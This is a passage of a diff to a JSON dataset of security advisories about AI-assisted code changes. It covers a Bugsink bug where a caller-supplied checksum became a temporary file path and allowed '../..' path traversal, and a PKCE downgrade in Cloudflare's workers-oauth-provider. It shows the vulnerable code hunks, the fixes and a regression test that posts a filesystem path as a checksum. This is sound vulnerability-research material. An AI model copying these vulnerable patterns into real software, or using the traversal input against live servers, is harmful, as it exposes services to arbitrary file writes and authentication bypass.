+    "qualification": "Local tag resolution matches the retained authoritative remote-tag receipt. Actual tasks source and official advisory/release snapshots establish the boundary. No wheel/container equivalence or all-later-release guarantee is claimed."
    },
    "published_at": "2026-04-10",
    "severity": null,
    "cwes": [],
-   "description": "The new bundle assembly code derived each entry's temporary file path from the checksum supplied by the caller, so a value containing parent-directory segments such as ../.. wrote outside the temporary directory while chunks were still appended before the content was verified against the submitted checksum. An authenticated user could place attacker-controlled content at a path relative to the server's temporary directory. The fix writes reconstructed files through anonymous temporary handles instead.",
+   "description": "An AI-assisted streaming change used a caller-supplied whole-file checksum as a temporary output path and wrote file content before checking the digest. A valid global upload token and referenced chunks are required. A later checksum failure does not undo the filesystem write, so upload authority can extend to creating or overwriting files writable by the service account. The repair uses server-selected temporary files instead of caller-derived destinations. Source tags establish 2.1.0 as affected and 2.1.1 as repaired; unauthenticated access, direct code execution, and built wheel or container equivalence are not established.",
    "references": [],
-   "mechanism": "files/tasks.py assemble_file built local_path = Path(tempdir, checksum) and opened it for writing, treating the caller-supplied checksum as a filename with no validation or normalization, so a value containing parent-directory segments escaped the temporary directory. The chunk writes happened before the content was verified against the checksum, and the repair uses tempfile.TemporaryFile rather than checksum-derived names.",
+   "mechanism": "An AI-assisted streaming change used a caller-supplied whole-file checksum as a temporary output path and wrote file content before checking the digest. A valid global upload token and referenced chunks are required. A later checksum failure does not undo the filesystem write, so upload authority can extend to creating or overwriting files writable by the service account.",
    "cause_category": "other_ambiguous",
    "ai_provenance": {
     "family": null,
@@ -32347,74 +32329,52 @@
     ]
    },
    "code_evidence": {
-    "fix_marker": null,
+    "summary": "An AI-assisted streaming change used a caller-supplied whole-file checksum as a temporary output path and wrote file content before checking the digest. A valid global upload token and referenced chunks are required. A later checksum failure does not undo the filesystem write, so upload authority can extend to creating or overwriting files writable by the service account. The repair uses server-selected temporary files instead of caller-derived destinations. Source tags establish 2.1.0 as affected and 2.1.1 as repaired; unauthenticated access, direct code execution, and built wheel or container equivalence are not established.",
     "candidate_url": "https://github.com/bugsink/bugsink/commit/358e4c5c585ddfb0ff983d5f40ddf5ab3f407e1c",
-    "fix_url": "https://github.com/bugsink/bugsink/commit/29e46f3737b15f6045073fb145ec936499e232f6",
     "advisory_url": "https://github.com/advisories/ghsa-8hw4-fhww-273g",
-    "summary": "AI-written code used an unsanitized checksum as a path, enabling path traversal and writing file chunks before detecting a checksum mismatch.",
-    "steps": [
-     {
-      "title": "AI change",
-      "detail": "Maximums for file uploads and assembly"
-     },
-     {
-      "title": "Fix",
-      "detail": "Avoid checksum-based temp file names"
-     }
-    ],
+    "annotation_mode": "hunk_specific",
     "display_hunks": [
      {
-      "file": "files/views.py",
-      "code": "@@ -13,7 +13,7 @@\n \n from bugsink.app_settings import get_settings\n from bugsink.transaction import durable_atomic, immediate_atomic\n-from bugsink.streams import handle_request_content_encoding\n+from bugsink.streams import handle_request_content_encoding, copy_stream_limited, MaxLengthExceeded\n from bsmain.models import AuthToken\n \n from .models import Chunk, File, FileMetadata\n@@ -25,13 +25,7 @@\n \n _KIBIBYTE = 1024\n _MEBIBYTE = 1024 * _KIBIBYTE\n-_GIBIBYTE = 1024 * _MEBIBYTE\n-\n-\n-class NamedBytesIO(BytesIO):\n-    def __init__(self, data, name):\n-        super().__init__(data)\n-        self.name = name\n+CHUNK_UPLOAD_SIZE = 2 * _MEBIBYTE\n \n \n def get_chunk_upload_settings(request, organization_slug):\n@@ -54,12 +48,12 @@ def get_chunk_upload_settings(request, organization_slug):\n         # I've played with 32-byte requests.\n         # note: sentry-cli <= v2.39.1 requires a power of 2 here.\n         # chunkSize == maxRequestSize per the comments on `chunksPerRequest: 1`.\n-        \"chunkSize\": 2 * _MEBIBYTE,\n-        \"maxRequestSize\": 2 * _MEBIBYTE,\n+        \"chunkSize\": CHUNK_UPLOAD_SIZE,\n+        \"maxRequestSize\": CHUNK_UPLOAD_SIZE,\n \n         # The limit here is _actually storing this_. For now \"just picking a high limit\" assuming that we'll have decent\n         # storage (#151) for the files eventually.\n-        \"maxFileSize\": 2 * _GIBIBYTE,\n+        \"maxFileSize\": get_settings().MAX_FILE_SIZE,\n \n         # In our current setup increasing concurrency doesn't help (single-writer architecture) while coming at the cost\n         # of potential reliability issues. Current codebase has works just fine with it _in principle_ (tested by\n@@ -152,31 +146,58 @@ def chunk_upload(request, organization_slug):\n         return get_chunk_upload_settings(request, organization_slug)\n \n     # POST: upload (full-size) \"chunks\" and store them as Chunk objects; file.name whould be the sha1 of the content.\n-    chunks = []\n-    if request.FILES:\n+    try:\n         # \"file\" and \"file_gzip\" are both possible multi-value keys for uploading (with associated semantics each)\n-        chunks = request.FILES.getlist(\"file\")\n-\n-        # NOTE: we read the whole unzipped file into memory; we _could_ take an approach like bugsink/streams.py.\n-        # (Note that, because of the auth layer in front, we're slightly less worried about adverserial scenarios)\n-        chunks += [\n-            NamedBytesIO(GzipFile(fileobj=file_gzip, mode=\"rb\").read(), name=file_gzip.name)\n-            for file_gzip in request.FILES.getlist(\"file_gzip\")]\n-\n-    for chunk in chunks:\n-        data = chunk.getvalue()\n-\n-        # usedforsecurity=False: sha1 is not used cryptographically, and it's part of the protocol, so we use it as is.\n-        if sha1(data, usedforsecurity=False).hexdigest() != chunk.name:\n-            raise Exception(\"checksum mismatch\")\n-\n-        with immediate_atomic():  # a snug fit around the only DB-writing thing we do here to ensure minimal blocking\n-            _, _ = Chunk.objects.get_or_create(\n-                checksum=chunk.name,\n-                defaults={\n-                    \"size\": len(data),\n-                    \"data\": data,  # NOTE: further possible optimization: don't even read the file when already existing\n-                })\n+        for chunk in request.FILES.getlist(\"file\"):\n+            output_stream = BytesIO()\n+            copy_stream_limited(\n+                chunk,\n+                output_stream,\n+                max_bytes=CHUNK_UPLOAD_SIZE,\n+                reason=f\"chunk upload size: {CHUNK_UPLOAD_SIZE}\",\n+            )\n+            data = output_stream.getvalue()\n+\n+            # usedforsecurity=False: sha1 is not used cryptographically, and it's part of the protocol, so we use it\n+            # as is.\n+            if sha1(data, usedforsecurity=False).hexdigest() != chunk.name:\n+                raise Exception(\"checksum mismatch\")\n+\n+            # a snug fit around the only DB-writing thing we do here to ensure minimal blocking\n+            with immediate_atomic():\n+                _, _ = Chunk.objects.get_or_create(\n+                    checksum=chunk.name,\n+                    defaults={",
-      "annotation": "Streams uploaded chunks through the bounded copier with the upload size exposed in settings, landing the ingestion refactor that gave bundle assembly its checksum-derived temporary paths.",
-      "role": "candidate"
-     },
-     {
-      "file": "files/tests.py",
-      "code": "@@ -10,6 +10,7 @@\n import subprocess\n import tempfile\n from pathlib import Path\n+from zipfile import ZipFile, ZIP_DEFLATED\n \n from django.test import tag\n from django.contrib.auth import get_user_model\n@@ -26,10 +27,12 @@\n from bsmain.models import AuthToken\n from bugsink.moreiterutils import batched\n from bugsink.app_settings import override_settings as bugsink_override_settings\n+from bugsink.streams import MaxLengthExceeded\n \n from .models import Chunk, File, FileMetadata\n from .storage_registry import override_object_storages\n from .tasks import assemble_file\n+from .views import CHUNK_UPLOAD_SIZE\n \n \n User = get_user_model()\n@@ -81,6 +84,43 @@ def test_auth_wrong_token(self):\n         self.assertEqual(401, response.status_code)\n         self.assertEqual({\"error\": \"Invalid token\"}, response.json())\n \n+    def test_chunk_upload_settings_use_real_limits(self):\n+        with bugsink_override_settings(MAX_FILE_SIZE=1234):\n+            response = self.client.get(\"/api/0/organizations/anyorg/chunk-upload/\", headers=self.token_headers)\n+\n+        self.assertEqual(200, response.status_code)\n+        self.assertEqual(CHUNK_UPLOAD_SIZE, response.json()[\"chunkSize\"])\n+        self.assertEqual(CHUNK_UPLOAD_SIZE, response.json()[\"maxRequestSize\"])\n+        self.assertEqual(1234, response.json()[\"maxFileSize\"])\n+\n+    def test_chunk_upload_rejects_plain_chunk_larger_than_advertised(self):\n+        data = b\"x\" * (CHUNK_UPLOAD_SIZE + 1)\n+        upload = BytesIO(data)\n+        upload.name = sha1(data, usedforsecurity=False).hexdigest()\n+\n+        response = self.client.post(\n+            \"/api/0/organizations/anyorg/chunk-upload/\",\n+            data={\"file\": upload},\n+            headers=self.token_headers,\n+        )\n+\n+        self.assertEqual(413, response.status_code)\n+        self.assertIn(\"chunk upload size\", response.json()[\"error\"])\n+\n+    def test_chunk_upload_rejects_gzipped_chunk_larger_than_advertised_after_decompression(self):\n+        data = b\"x\" * (CHUNK_UPLOAD_SIZE + 1)\n+        upload = BytesIO(gzip.compress(data))\n+        upload.name = sha1(data, usedforsecurity=False).hexdigest()\n+\n+        response = self.client.post(\n+            \"/api/0/organizations/anyorg/chunk-upload/\",\n+            data={\"file_gzip\": upload},\n+            headers=self.token_headers,\n+        )\n+\n+        self.assertEqual(413, response.status_code)\n+        self.assertIn(\"chunk upload size\", response.json()[\"error\"])\n+\n     def test_assemble_file_to_object_storage(self):\n         data = b\"hello world\"\n         checksum = sha1(data, usedforsecurity=False).hexdigest()\n@@ -96,6 +136,81 @@ def test_assemble_file_to_object_storage(self):\n                 self.assertEqual(data, file.get_raw_data())\n                 self.assertEqual(data, Path(tempdir, checksum).read_bytes())\n \n+    def test_open_for_read_works_for_db_and_object_storage(self):\n+        data = b\"hello world\"\n+        checksum = sha1(data, usedforsecurity=False).hexdigest()\n+\n+        file = File.objects.create(checksum=checksum, filename=\"hello.txt\", size=len(data), data=data)\n+        with file.open_for_read() as f:\n+            self.assertEqual(data, f.read())\n+\n+        with tempfile.TemporaryDirectory() as tempdir:\n+            with override_object_storages(get_test_object_storages(tempdir, use_for_write=True)):\n+                call_command(\"migrate_to_current_objectstorage\", \"file\", stdout=io.StringIO())\n+\n+                file.refresh_from_db()\n+                with file.open_for_read() as f:\n+                    self.assertEqual(data, f.read())\n+\n+    def test_assemble_file_enforces_max_file_size(self):\n+        chunk_a = b\"hello \"\n+        chunk_b = b\"world\"\n+        checksum = sha1(chunk_a + chunk_b, usedforsecurity=False).hexdigest()\n+",
-      "annotation": "Imports `ZipFile`, `ZIP_DEFLATED`, `MaxLengthExceeded`, and `CHUNK_UPLOAD_SIZE` into the file tests and adds a chunk-upload case exercising the artifact-bundle assemble endpoint.",
-      "role": "candidate"
+      "file": "files/tasks.py",
+      "role": "candidate",
+      "code": "@@ -121,23 +197,16 @@\n+    max_file_size = get_settings().MAX_FILE_SIZE\n \n-    # usedforsecurity=false: sha1 is not used cryptographically, and it's part of the protocol, so we use it as is.\n-    if sha1(data, usedforsecurity=False).hexdigest() != checksum:\n-        raise Exception(\"checksum mismatch\")\n+    with tempfile.TemporaryDirectory() as tempdir:\n+        local_path = Path(tempdir, checksum)\n \n-    write_storage = get_write_storage(\"file\")\n-    file, created = File.objects.get_or_create(\n-        checksum=checksum,\n-        defaults={\n-            \"size\": len(data),\n-            \"data\": b\"\" if write_storage is not None else data,\n-            \"filename\": filename,\n-            \"storage_backend\": None if write_storage is None else write_storage.name,\n-        })\n+        # usedforsecurity=false: sha1 is not used cryptographically, and it's part of the protocol, so we use it as is.\n+        checksum_state = sha1(usedforsecurity=False)\n+        size = 0\n \n-    if created and write_storage is not None:\n-        write_to_storage(\"file\", checksum, data)\n+        with local_path.open(\"wb\") as output_stream:\n+            for chunk in chunks_in_order:\n+                chunk_data = _binary_to_bytes(chunk.data)\n+                next_size = size + len(chunk_data)\n+                if next_size > max_file_size:\n+                    raise ValueError(\"Assembled file exceeds MAX_FILE_SIZE\")\n \n-    # the assumption here is: chunks are basically use-once, so we can delete them after use. \"in theory\" a chunk may\n-    # be used in multiple files (which are still being assembled) but with chunksizes in the order of 1MiB, I'd say this\n-    # is unlikely.\n-    chunks.delete()\n-    return file, created\n",
+      "annotation": "The streaming assembler builds its temporary destination from the supplied checksum and writes before digest validation, so later rejection cannot undo the filesystem effect.",
+      "source_url": "https://github.com/bugsink/bugsink/commit/358e4c5c585ddfb0ff983d5f40ddf5ab3f407e1c"
      },
      {
       "file": "files/tasks.py",
-      "code": "@@ -1,20 +1,22 @@\n import re\n import logging\n+import tempfile\n from datetime import timedelta\n from zipfile import ZipFile\n import json\n from hashlib import sha1\n-from io import BytesIO\n from os.path import basename\n+from pathlib import Path\n from django.utils import timezone\n \n from compat.timestamp import parse_timestamp\n from snappea.decorators import shared_task\n \n from bugsink.transaction import immediate_atomic, delay_on_commit\n from bugsink.app_settings import get_settings\n+from bugsink.streams import copy_stream_limited\n \n-from .models import Chunk, File, FileMetadata, write_to_storage\n+from .models import Chunk, File, FileMetadata, write_fileobj_to_storage, _binary_to_bytes\n from .storage_registry import get_write_storage\n \n logger = logging.getLogger(\"bugsink.api\")\n@@ -29,8 +31,81 @@\n # known pattern for \"one in code\", such that we can at least warn if it's not the same at the actually reported one.\n # See #157\n IN_CODE_DEBUG_ID_REGEX = re.compile(\n-    r'e\\._sentryDebugIds\\[.*?\\]\\s*=\\s*[\"\\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})[\"\\']'\n+    rb'e\\._sentryDebugIds\\[.*?\\]\\s*=\\s*[\"\\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})[\"\\']'\n )\n+DEBUG_ID_SCAN_TAIL_SIZE = 64 * 1024\n+\n+\n+def create_file_from_local_path(checksum, filename, size, local_path):\n+    write_storage = get_write_storage(\"file\")\n+    file, created = File.objects.get_or_create(\n+        checksum=checksum,\n+        defaults={\n+            \"size\": size,\n+            \"data\": b\"\" if write_storage is not None else local_path.read_bytes(),\n+            \"filename\": filename,\n+            \"storage_backend\": None if write_storage is None else write_storage.name,\n+        })\n+\n+    if created and write_storage is not None:\n+        with local_path.open(\"rb\") as f:\n+            write_fileobj_to_storage(\"file\", checksum, f)\n+\n+    return file, created\n+\n+\n+def read_limited_bytes(input_stream, max_bytes):\n+    with tempfile.SpooledTemporaryFile(max_size=max_bytes + 1) as output_stream:\n+        bytes_read = copy_stream_limited(\n+            input_stream,\n+            output_stream,\n+            max_bytes=max_bytes,\n+            reason=f\"MAX_FILE_SIZE: {max_bytes}\",\n+        )\n+        output_stream.seek(0)\n+        return output_stream.read(), bytes_read\n+\n+\n+def extract_zip_entry_to_path(bundle_zip, entry_name, local_path, max_bytes):\n+    # usedforsecurity=false: sha1 is not used cryptographically, it's part of the protocol, so we use it as is.\n+    checksum = sha1(usedforsecurity=False)\n+\n+    with bundle_zip.open(entry_name) as input_stream:\n+        with local_path.open(\"wb\") as output_stream:\n+            size = copy_stream_limited(\n+                input_stream,\n+                output_stream,\n+                max_bytes=max_bytes,\n+                reason=f\"MAX_FILE_SIZE: {max_bytes}\",\n+                digest=checksum,\n+            )\n+\n+    return checksum.hexdigest(), size\n+\n+\n+def find_in_code_debug_ids(local_path):\n+    matches = set()\n+    tail = b\"\"\n+\n+    with local_path.open(\"rb\") as f:\n+        while True:\n+            chunk = f.read(64 * 1024)\n+            if not chunk:",
-      "annotation": "Adds the bundle assembly helpers that write reconstructed files into caller-provided local paths, the design that let the submitted checksum become a temporary filename used for writes.",
-      "role": "candidate"
-     },
-     {
-      "file": "files/tests.py",
-      "code": "@@ -1,5 +1,5 @@\n from hashlib import sha1\n-from uuid import UUID\n+from uuid import UUID, uuid4\n import json\n import gzip\n import io\n@@ -211,6 +211,41 @@ def test_artifact_bundle_rejects_extracted_file_larger_than_max_file_size(self):\n                             headers=self.token_headers,\n                         )\n \n+    def test_artifact_bundle_assemble_does_not_use_checksum_as_temp_filename(self):\n+        data = b\"hello world\"\n+        real_checksum = sha1(data, usedforsecurity=False).hexdigest()\n+        Chunk.objects.create(checksum=real_checksum, size=len(data), data=data)\n+\n+        with tempfile.TemporaryDirectory() as tempdir:\n+            probe_path = Path(tempdir, f\"probe-{uuid4().hex}.txt\")\n+\n+            try:\n+                self.client.post(\n+                    \"/api/0/organizations/anyorg/artifactbundle/assemble/\",\n+                    json.dumps({\"checksum\": str(probe_path), \"chunks\": [real_checksum], \"projects\": [\"unused\"]}),\n+                    content_type=\"application/json\",\n+                    headers=self.token_headers,\n+                )\n+            except Exception:\n+                pass  # we don't care about the details of failure, we just care about the probe file not being created\n+\n+            self.assertFalse(probe_path.exists())\n+\n+    def test_assemble_file_does_not_use_checksum_as_temp_filename(self):\n+        data = b\"hello world\"\n+        real_checksum = sha1(data, usedforsecurity=False).hexdigest()\n+        Chunk.objects.create(checksum=real_checksum, size=len(data), data=data)\n+\n+        with tempfile.TemporaryDirectory() as tempdir:\n+            probe_path = Path(tempdir, f\"probe-{uuid4().hex}.txt\")\n+\n+            try:\n+                assemble_file(str(probe_path), [real_checksum], filename=\"hello.txt\")\n+            except Exception:\n+                pass  # we don't care about the details of failure, we just care about the probe file not being created\n+\n+            self.assertFalse(probe_path.exists())\n+\n     def test_migrate_file_to_and_from_object_storage(self):\n         data = b\"hello world\"\n         checksum = sha1(data, usedforsecurity=False).hexdigest()",
-      "annotation": "Adds a regression test that posts a filesystem path as the `checksum` to the artifact-bundle assemble endpoint and asserts it is not used as a temp filename.",
-      "role": "fix"
-     },
-     {
-      "file": "files/tasks.py",
-      "code": "@@ -6,7 +6,6 @@\n import json\n from hashlib import sha1\n from os.path import basename\n-from pathlib import Path\n from django.utils import timezone\n \n from compat.timestamp import parse_timestamp\n@@ -36,20 +35,20 @@\n DEBUG_ID_SCAN_TAIL_SIZE = 64 * 1024\n \n \n-def create_file_from_local_path(checksum, filename, size, local_path):\n+def create_file_from_local_file(checksum, filename, size, local_file):\n     write_storage = get_write_storage(\"file\")\n     file, created = File.objects.get_or_create(\n         checksum=checksum,\n         defaults={\n             \"size\": size,\n-            \"data\": b\"\" if write_storage is not None else local_path.read_bytes(),\n+            \"data\": b\"\" if write_storage is not None else local_file.read(),\n             \"filename\": filename,\n             \"storage_backend\": None if write_storage is None else write_storage.name,\n         })\n \n     if created and write_storage is not None:\n-        with local_path.open(\"rb\") as f:\n-            write_fileobj_to_storage(\"file\", checksum, f)\n+        local_file.seek(0)\n+        write_fileobj_to_storage(\"file\", checksum, local_file)\n \n     return file, created\n \n@@ -66,43 +65,42 @@ def read_limited_bytes(input_stream, max_bytes):\n         return output_stream.read(), bytes_read\n \n \n-def extract_zip_entry_to_path(bundle_zip, entry_name, local_path, max_bytes):\n+def extract_zip_entry_to_file(bundle_zip, entry_name, local_file, max_bytes):\n     # usedforsecurity=false: sha1 is not used cryptographically, it's part of the protocol, so we use it as is.\n     checksum = sha1(usedforsecurity=False)\n \n     with bundle_zip.open(entry_name) as input_stream:\n-        with local_path.open(\"wb\") as output_stream:\n-            size = copy_stream_limited(\n-                input_stream,\n-                output_stream,\n-                max_bytes=max_bytes,\n-                reason=f\"MAX_FILE_SIZE: {max_bytes}\",\n-                digest=checksum,\n-            )\n+        size = copy_stream_limited(\n+            input_stream,\n+            local_file,\n+            max_bytes=max_bytes,\n+            reason=f\"MAX_FILE_SIZE: {max_bytes}\",\n+            digest=checksum,\n+        )\n \n     return checksum.hexdigest(), size\n \n \n-def find_in_code_debug_ids(local_path):\n+def find_in_code_debug_ids(local_file):\n     matches = set()\n     tail = b\"\"\n \n-    with local_path.open(\"rb\") as f:\n-        while True:\n-            chunk = f.read(64 * 1024)\n-            if not chunk:\n-                break\n+    local_file.seek(0)\n+    while True:\n+        chunk = local_file.read(64 * 1024)\n+        if not chunk:\n+            break\n \n-            haystack = tail + chunk\n-            if len(haystack) > DEBUG_ID_SCAN_TAIL_SIZE:\n-                cutoff = len(haystack) - DEBUG_ID_SCAN_TAIL_SIZE\n-                scan_bytes = haystack[:cutoff]\n-                tail = haystack[cutoff:]\n-            else:\n-                scan_bytes = b\"\"\n-                tail = haystack\n+        haystack = tail + chunk\n+        if len(haystack) > DEBUG_ID_SCAN_TAIL_SIZE:\n+            cutoff = len(haystack) - DEBUG_ID_SCAN_TAIL_SIZE\n+            scan_bytes = haystack[:cutoff]",
-      "annotation": "Rewrites bundle assembly to use anonymous temporary file handles instead of local paths assembled from checksums, so unverified input can no longer name the file that receives upload content.",
-      "role": "fix"
+      "role": "fix",
+      "code": "@@ -197,22 +194,21 @@\n     max_file_size = get_settings().MAX_FILE_SIZE\n \n     with tempfile.TemporaryDirectory() as tempdir:\n-        local_path = Path(tempdir, checksum)\n-\n-        # usedforsecurity=false: sha1 is not used cryptographically, and it's part of the protocol, so we use it as is.\n-        checksum_state = sha1(usedforsecurity=False)\n-        size = 0\n+        with tempfile.TemporaryFile(dir=tempdir) as local_file:\n+            # usedforsecurity=false: sha1 is not used cryptographically, and it's part of the protocol, so we use it\n+            # as is.\n+            checksum_state = sha1(usedforsecurity=False)\n+            size = 0\n \n-        with local_path.open(\"wb\") as output_stream:\n             for chunk in chunks_in_order:\n                 chunk_data = _binary_to_bytes(chunk.data)\n                 next_size = size + len(chunk_data)\n                 if next_size > max_file_size:\n                     raise ValueError(\"Assembled file exceeds MAX_FILE_SIZE\")\n \n-                output_stream.write(chunk_data)\n+                local_file.write(chunk_data)\n                 checksum_state.update(chunk_data)\n                 size = next_size\n \n-        if checksum_state.hexdigest() != checksum:\n-            raise Exception(\"checksum mismatch\")\n+            if checksum_state.hexdigest() != checksum:\n+                raise Exception(\"checksum mismatch\")\n",
+      "annotation": "The repair replaces the caller-derived path with a server-selected temporary file while retaining digest validation.",
+      "source_url": "https://github.com/bugsink/bugsink/commit/29e46f3737b15f6045073fb145ec936499e232f6"
      }
     ],
-    "candidate_patch_sha256": "1ad03a56ada05204be2e2db461b5ad3326f1df7e90d4747b5b82514c09afa46b",
-    "fix_patch_sha256": "27cd447269a556c2e42fdc9dd847b9c0f2fd9d4887d2515290a9045bcf7168ee",
+    "candidate_patch_sha256": "46c6be853a6d18cddf85a8730e6d82bfaff27c49a1b2f26fec3df3320b6e2212",
     "required_anchors": {
      "candidate": [
-      "DEBUG_ID_SCAN_TAIL_SIZE",
-      "CHUNK_UPLOAD_SIZE",
-      "MAX_FILE_SIZE"
+      "Path(tempdir, checksum)"
      ],
      "fix": [
-      "DEBUG_ID_SCAN_TAIL_SIZE",
-      "MAX_FILE_SIZE",
-      "TemporaryDirectory"
+      "TemporaryFile"
      ]
     },
-    "annotation_mode": "hunk_specific"
+    "fix_url": "https://github.com/bugsink/bugsink/commit/29e46f3737b15f6045073fb145ec936499e232f6",
+    "fix_files": [
+     "files/tasks.py"
+    ],
+    "fix_patch_sha256": "ce47465f498407f54f68952d473b14e463a19698866a5f4ba1af62bebe8fe6bb",
+    "steps": [
+     {
+      "title": "fix",
+      "detail": "The repair uses server-selected temporary files instead of caller-derived destinations. Source tags establish 2.1.0 as affected and 2.1.1 as repaired; unauthenticated access, direct code execution, and built wheel or container equivalence are not established."
+     }
+    ]
    },
    "ir_chain": null,
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-8hw4-fhww-273g",
    "publication_issues": [],
-   "publication_status": "confirmed"
+   "publication_status": "provisional"
   },
   {
    "case_id": "GHSA-75HX-XJ24-MQRW",
@@ -42382,34 +42342,35 @@
    ],
    "carrier_set": [],
    "minimum_fix_set": [
-    "d954473f066f0daa3949717fd4d6e805d2ac618b",
-    "09a2adb2f197469e5b64e8b89c22b6687cacabc1"
+    "d954473f066f0daa3949717fd4d6e805d2ac618b"
    ],
    "gates": {
-    "identity": "PASS",
-    "ai_hunk": "PASS",
-    "topology": "PASS",
-    "but_for": "PASS",
-    "fix_reversal": "PASS",
-    "release": "PASS",
-    "uniqueness": "PASS"
+    "ai_hunk": "UNKNOWN",
+    "but_for": "UNKNOWN",
+    "fix_reversal": "UNKNOWN",
+    "identity": "UNKNOWN",
+    "release": "UNKNOWN",
+    "topology": "UNKNOWN",
+    "uniqueness": "UNKNOWN"
    },
    "vulnerable_release": {
-    "kind": "git_tag_interval",
-    "version": "0.0.2 through 0.0.4",
-    "tag": "v0.0.4"
+    "kind": "advisory_range_with_source_samples",
+    "version": "<0.0.5",
+    "tag": null,
+    "qualification": "No local v0.0.5 tag exists. The version commit and release merge are reachable, contrary to lane a. The package is a retained registry snapshot, not a reproduced build or observed deployment. The earlier published artifact range remains the publisher claim, corroborated by sampled source boundaries."
    },
    "fixed_release": {
-    "kind": "npm_version",
+    "kind": "npm_artifact",
     "version": "0.0.5",
-    "tag": "v0.0.6"
+    "tag": null,
+    "artifact_sha256": "6ea07f2856555ead8e9b02f0c4643c8a4bb7233884a7bdb4544cbb3f183a3ea5"
    },
    "published_at": "2025-05-01",
    "severity": null,
    "cwes": [],
-   "description": "Optional PKCE in handleAuthorizationCodeGrant can be skipped by a downgrade: parseAuthRequest stores code_challenge only if the authorization request includes it, and the token endpoint verifies a code_verifier only when the grant already has codeChallenge (isPkceEnabled = !!grantData.codeChallenge). RFC 9700 §2.1.1/§4.8.2 requires rejecting a token request that carries code_verifier unless a code_challenge was present at authorization. Without that mismatch check, an attacker who strips code_challenge from the authorization request causes the AS to persist a non-PKCE grant; a later token request is then accepted without PKCE, completely bypassing the intended code-binding defense (CWE-287). GHSA/CNA: npm @cloudflare/workers-oauth-provider < 0.0.5, patched in 0.0.5.",
+   "description": "An AI-assisted PKCE feature checked a verifier only when an authorization grant stored a challenge. A token request could therefore present a verifier for a grant created without a challenge. The published downgrade flow also requires absent or incorrect client state validation; ordinary grant, client, authentication and redirect checks still apply. The repair rejects a verifier when the stored grant has no challenge and is present in the retained npm 0.0.5 package. This closes the scoped consistency defect without claiming universal OAuth protection.",
    "references": [],
-   "mechanism": "Optional PKCE in handleAuthorizationCodeGrant can be skipped by a downgrade: parseAuthRequest stores code_challenge only if the authorization request includes it, and the token endpoint verifies a code_verifier only when the grant already has codeChallenge (isPkceEnabled = !!grantData.codeChallenge). RFC 9700 §2.1.1/§4.8.2 requires rejecting a token request that carries code_verifier unless a code_challenge was present at authorization. Without that mismatch check, an attacker who strips code_challenge from the authorization request causes the AS to persist a non-PKCE grant; a later token request is then accepted without PKCE, completely bypassing the intended code-binding defense (CWE-287). GHSA/CNA: npm @cloudflare/workers-oauth-provider < 0.0.5, patched in 0.0.5.",
+   "mechanism": "An AI-assisted PKCE feature checked a verifier only when an authorization grant stored a challenge. A token request could therefore present a verifier for a grant created without a challenge. The published downgrade flow also requires absent or incorrect client state validation; ordinary grant, client, authentication and redirect checks still apply.",
    "cause_category": "auth_access",
    "ai_provenance": {
     "family": "claude",
@@ -42428,67 +42389,54 @@
        "name": "Glen Maddern",
        "email": "glen@cloudflare.com"
       }
-     },
-     {
-      "sha": "09a2adb2f197469e5b64e8b89c22b6687cacabc1",
-      "classification": "no_ai_marker",
-      "author": {
-       "name": "Kenton Varda",
-       "email": "kenton@cloudflare.com"
-      }
      }
     ]
    },
    "code_evidence": {
-    "fix_marker": null,
+    "summary": "An AI-assisted PKCE feature checked a verifier only when an authorization grant stored a challenge. A token request could therefore present a verifier for a grant created without a challenge. The published downgrade flow also requires absent or incorrect client state validation; ordinary grant, client, authentication and redirect checks still apply. The repair rejects a verifier when the stored grant has no challenge and is present in the retained npm 0.0.5 package. This closes the scoped consistency defect without claiming universal OAuth protection.",
     "candidate_url": "https://github.com/cloudflare/workers-oauth-provider/commit/b1079e7beb5f4821a0ffc7ae07670c417b66d07d",
-    "fix_url": "https://github.com/cloudflare/workers-oauth-provider/commit/d954473f066f0daa3949717fd4d6e805d2ac618b",
     "advisory_url": "https://github.com/advisories/ghsa-qgp8-v765-qxx9",
-    "summary": "Claude-implemented PKCE checked a verifier only when a challenge was already stored. Removing the challenge could downgrade the authorization flow and bypass PKCE.",
-    "steps": [
+    "annotation_mode": "hunk_specific",
+    "display_hunks": [
      {
-      "title": "AI change",
-      "detail": "Ask Claude to implement PKCE support (for OAuth 2.1)."
+      "file": "oauth-provider.ts",
+      "role": "candidate",
+      "code": "@@ -695,6 +719,38 @@\n       );\n     }\n \n+    // Verify PKCE code_verifier if code_challenge was provided during authorization\n+    if (grantData.codeChallenge) {\n+      if (!codeVerifier) {\n+        return createErrorResponse(\n+          'invalid_request',\n+          'code_verifier is required for PKCE'\n+        );\n+      }\n+\n+      // Verify the code verifier against the stored code challenge\n+      let calculatedChallenge: string;\n+\n+      if (grantData.codeChallengeMethod === 'S256') {\n+        // SHA-256 transformation for S256 method\n+        const encoder = new TextEncoder();\n+        const data = encoder.encode(codeVerifier);\n+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);\n+        const hashArray = Array.from(new Uint8Array(hashBuffer));\n+        calculatedChallenge = base64UrlEncode(String.fromCharCode(...hashArray));\n+      } else {\n+        // Plain method, direct comparison\n+        calculatedChallenge = codeVerifier;\n+      }\n+\n+      if (calculatedChallenge !== grantData.codeChallenge) {\n+        return createErrorResponse(\n+          'invalid_grant',\n+          'Invalid PKCE code_verifier'\n+        );\n+      }\n+    }\n+\n     // Code is valid - generate tokens\n     const accessTokenSecret = generateRandomString(TOKEN_LENGTH);\n     const refreshTokenSecret = generateRandomString(TOKEN_LENGTH);\n",
+      "annotation": "Verifier validation runs only when the stored grant contains an authorization-time challenge.",
+      "source_url": "https://github.com/cloudflare/workers-oauth-provider/commit/b1079e7beb5f4821a0ffc7ae07670c417b66d07d"
      },
+     {
+      "file": "src/oauth-provider.ts",
+      "role": "fix",
+      "code": "@@ -1235,6 +1235,11 @@\n       return this.createErrorResponse('invalid_grant', 'Invalid redirect URI');\n     }\n \n+    // Reject if code_verifier is provided but PKCE wasn't used in authorization\n+    if (!isPkceEnabled && codeVerifier) {\n+      return this.createErrorResponse('invalid_request', 'code_verifier provided for a flow that did not use PKCE');\n+    }\n+\n     // Verify PKCE code_verifier if code_challenge was provided during authorization\n     if (isPkceEnabled) {\n       if (!codeVerifier) {\n",
+      "annotation": "The token endpoint rejects a verifier when the authorization grant has no stored challenge.",
